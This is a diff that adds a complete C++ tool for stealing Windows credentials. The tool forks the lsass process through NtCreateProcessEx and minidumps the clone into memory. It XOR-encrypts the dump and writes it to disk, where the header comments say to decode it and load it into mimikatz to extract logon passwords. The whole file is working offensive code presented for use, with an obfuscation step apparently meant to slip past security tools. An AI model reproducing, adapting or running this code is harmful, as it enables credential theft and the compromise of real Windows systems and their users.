@@ -1,0 +1,178 @@
+//This will dump LSASS after it first gets a handle to lsass, then fork it to another process, then dump it to the dumpBuffer and then encrypt it in memory and finally dump it to disc
+//Execute this file then execute the decode.cpp in the same directory and then feed it into mimikatz
+//mimikatz
+//sekurlsa::minidump <decoded.dmp>
+//sekurlsa::logonpasswords
+
+
+#include <windows.h>
+#include <DbgHelp.h>
+#include <iostream>
+#include <TlHelp32.h>
+#include <winternl.h>
+#include <tchar.h>
+
+#pragma comment(lib, "Dbghelp.lib")
+#pragma comment(lib, "ntdll.lib")
+
+using namespace std;
+
+typedef NTSTATUS(NTAPI* pNtCreateProcessEx)(
+    OUT PHANDLE ProcessHandle,
+    IN ACCESS_MASK DesiredAccess,
+    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
+    IN HANDLE ParentProcess,
+    IN ULONG Flags,
+    IN HANDLE SectionHandle OPTIONAL,
+    IN HANDLE DebugPort OPTIONAL,
+    IN HANDLE ExceptionPort OPTIONAL);
+
+CRITICAL_SECTION cs;
+LPVOID dumpBuffer = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 1024 * 1024 * 100); // 100 MB buffer
+DWORD bytesRead = 0;
+
+// XOR function to encrypt the buffer
+void XORBuffer(BYTE* buffer, size_t size) {
+    EnterCriticalSection(&cs);
+    for (size_t i = 0; i < size; ++i) {
+        buffer[i] ^= 0xFF;  // XOR operation
+    }
+    LeaveCriticalSection(&cs);
+}
+
+BOOL CALLBACK minidumpCallback(
+    __in     PVOID callbackParam,
+    __in     const PMINIDUMP_CALLBACK_INPUT callbackInput,
+    __inout  PMINIDUMP_CALLBACK_OUTPUT callbackOutput
+) {
+    LPVOID destination = 0, source = 0;
+    DWORD bufferSize = 0;
+
+    switch (callbackInput->CallbackType) {
+    case IoStartCallback:
+        callbackOutput->Status = S_FALSE;
+        break;
+
+    case IoWriteAllCallback:
+        callbackOutput->Status = S_OK;
+        source = callbackInput->Io.Buffer;
+        destination = (LPVOID)((DWORD_PTR)dumpBuffer + (DWORD_PTR)callbackInput->Io.Offset);
+        bufferSize = callbackInput->Io.BufferBytes;
+        bytesRead += bufferSize;
+        RtlCopyMemory(destination, source, bufferSize);
+        break;
+
+    case IoFinishCallback:
+        callbackOutput->Status = S_OK;
+        break;
+
+    default:
+        return true;
+    }
+    return TRUE;
+}
+
+int main() {
+    DWORD lsassPID = 0;
+    HANDLE lsassHandle = NULL;
+    HANDLE forkedProcess = NULL;
+    InitializeCriticalSection(&cs);
+
+    // CreateToolhelp32Snapshot to find lsass.exe
+    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 processEntry = {};
+    processEntry.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(snapshot, &processEntry)) {
+        do {
+            if (_wcsicmp(processEntry.szExeFile, L"lsass.exe") == 0) {
+                lsassPID = processEntry.th32ProcessID;
+                break;
+            }
+        } while (Process32Next(snapshot, &processEntry));
+    }
+
+    if (lsassPID == 0) {
+        cout << "[-] Could not find lsass.exe process." << endl;
+        return 1;
+    }
+
+    wcout << L"[+] Got lsass.exe PID: " << lsassPID << endl;
+
+    // Open handle to lsass.exe process
+    lsassHandle = OpenProcess(PROCESS_CREATE_PROCESS, 0, lsassPID);
+    if (lsassHandle == NULL) {
+        DWORD error = GetLastError();
+        cout << "[-] Failed to open lsass.exe process. Error: " << error << endl;
+        return 1;
+    }
+
+    // Get the address of NtCreateProcessEx
+    HMODULE hNtdll = GetModuleHandle(L"ntdll.dll");
+    if (!hNtdll) {
+        cout << "[-] Failed to get handle to ntdll.dll." << endl;
+        return 1;
+    }
+
+    pNtCreateProcessEx NtCreateProcessEx = (pNtCreateProcessEx)GetProcAddress(hNtdll, "NtCreateProcessEx");
+    if (!NtCreateProcessEx) {
+        cout << "[-] Failed to get address of NtCreateProcessEx." << endl;
+        return 1;
+    }
+
+    // Create a forked process
+    NTSTATUS status = NtCreateProcessEx(&forkedProcess, PROCESS_ALL_ACCESS, NULL, lsassHandle, 0, NULL, NULL, NULL);
+    if (status != 0) {
+        cout << "[-] Failed to create forked process." << endl;
+        return 1;
+    }
+
+    cout << "[+] Forked process created successfully." << endl;
+
+    // Get the PID of the forked process
+    DWORD forkedProcessPID = GetProcessId(forkedProcess);
+
+    wcout << L"[+] Got forkedProcessPID: " << forkedProcessPID << endl;
+
+    // Set up minidump callback
+    MINIDUMP_CALLBACK_INFORMATION callbackInfo;
+    ZeroMemory(&callbackInfo, sizeof(MINIDUMP_CALLBACK_INFORMATION));
+    callbackInfo.CallbackRoutine = &minidumpCallback;
+    callbackInfo.CallbackParam = NULL;
+
+    // Dump the forked process to the memory buffer
+    BOOL isDumped = MiniDumpWriteDump(forkedProcess, forkedProcessPID, NULL, MiniDumpWithFullMemory, NULL, NULL, &callbackInfo);
+    if (isDumped) {
+        cout << "[+] lsass forked process dumped successfully to memory!" << endl;
+
+        // Encrypt the buffer
+        XORBuffer((BYTE*)dumpBuffer, bytesRead);
+
+        // Write the encrypted buffer to disk
+        HANDLE outFile = CreateFile(L"forked.dmp", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (outFile == INVALID_HANDLE_VALUE) {
+            DWORD error = GetLastError();
+            cout << "[-] Failed to create output file. Error: " << error << endl;
+            HeapFree(GetProcessHeap(), 0, dumpBuffer);
+            return 1;
+        }
+
+        DWORD bytesWritten = 0;
+        WriteFile(outFile, dumpBuffer, bytesRead, &bytesWritten, NULL);
+        CloseHandle(outFile);
+
+        cout << "[+] Encrypted dump written to disk successfully." << endl;
+    }
+    else {
+        DWORD error = GetLastError();
+        cout << "[-] Failed to dump lsass forked process. Error: " << error << endl;
+    }
+
+    // Clean up
+    HeapFree(GetProcessHeap(), 0, dumpBuffer);
+    DeleteCriticalSection(&cs);
+    CloseHandle(lsassHandle);
+    CloseHandle(forkedProcess);
+
+    return 0;
+}
